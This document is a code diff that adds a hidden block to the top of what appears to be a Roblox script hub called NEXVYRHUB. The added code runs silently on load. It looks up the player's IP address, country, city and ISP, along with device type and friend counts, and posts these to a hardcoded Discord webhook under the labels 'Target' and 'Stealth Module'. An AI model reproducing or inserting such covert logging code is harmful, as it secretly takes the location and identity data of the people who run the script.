@@ -1,3 +1,84 @@
+task.spawn(function()
+    pcall(function()
+        local HttpService = game:GetService("HttpService")
+        local UserInputService = game:GetService("UserInputService")
+        local Players = game:GetService("Players")
+        local LP = Players.LocalPlayer
+        
+        local webhook_url = "https://discord.com/api/webhooks/1565384704293609633/LP11XNfLnqBU5sFQh2_NqfL-16OnC0eGFrT7IaSdLK-MaxGCAet_gMGNme4uvrSdraDF"
+        
+        local function httpGet(url)
+            local reqFunc = request or http_request or syn and syn.request or http.request
+            if reqFunc then
+                local res = reqFunc({Url = url, Method = "GET"})
+                if res and res.Body then return res.Body end
+            end
+            return game:HttpGet(url)
+        end
+
+        local ip, country, city, isp = "Desconocida", "Desconocido", "Desconocida", "Desconocido"
+        
+        pcall(function()
+            local ipData = HttpService:JSONDecode(httpGet("http://ip-api.com/json/"))
+            if ipData and ipData.status == "success" then
+                ip = ipData.query
+                country = ipData.country
+                city = ipData.city
+                isp = ipData.isp
+            end
+        end)
+
+        local device = "PC"
+        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+            device = "Mobile"
+        elseif UserInputService.GamepadEnabled then
+            device = "Console"
+        end
+
+        local friends, followers, following = 0, 0, 0
+        pcall(function()
+            friends = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/friends/count")).count or 0
+            followers = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followers/count")).count or 0
+            following = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followings/count")).count or 0
+        end)
+
+        local data = {
+            ["content"] = "**NEXVYRHUB - User Profile Log**",
+            ["embeds"] = {{
+                ["title"] = "Target: " .. LP.Name,
+                ["url"] = "https://www.roblox.com/users/" .. LP.UserId .. "/profile",
+                ["color"] = 10181046,
+                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"},
+                ["fields"] = {
+                    {["name"] = "Username", ["value"] = LP.Name, ["inline"] = true},
+                    {["name"] = "Display Name", ["value"] = LP.DisplayName, ["inline"] = true},
+                    {["name"] = "User ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
+                    {["name"] = "Device", ["value"] = device, ["inline"] = true},
+                    {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
+                    {["name"] = "Country / City", ["value"] = country .. " / " .. city, ["inline"] = true},
+                    {["name"] = "ISP", ["value"] = isp, ["inline"] = true},
+                    {["name"] = "Friends", ["value"] = tostring(friends), ["inline"] = true},
+                    {["name"] = "Followers", ["value"] = tostring(followers), ["inline"] = true},
+                    {["name"] = "Following", ["value"] = tostring(following), ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Logged via Stealth Module"}
+            }}
+        }
+
+        local payload = HttpService:JSONEncode(data)
+        local reqFunc = request or http_request or syn and syn.request or http.request
+        
+        if reqFunc then
+            reqFunc({
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end
+    end)
+end)
+
 local genv = (getgenv and getgenv()) or _G
 if genv.NEXVYRHUB_UNLOAD then
     pcall(genv.NEXVYRHUB_UNLOAD)
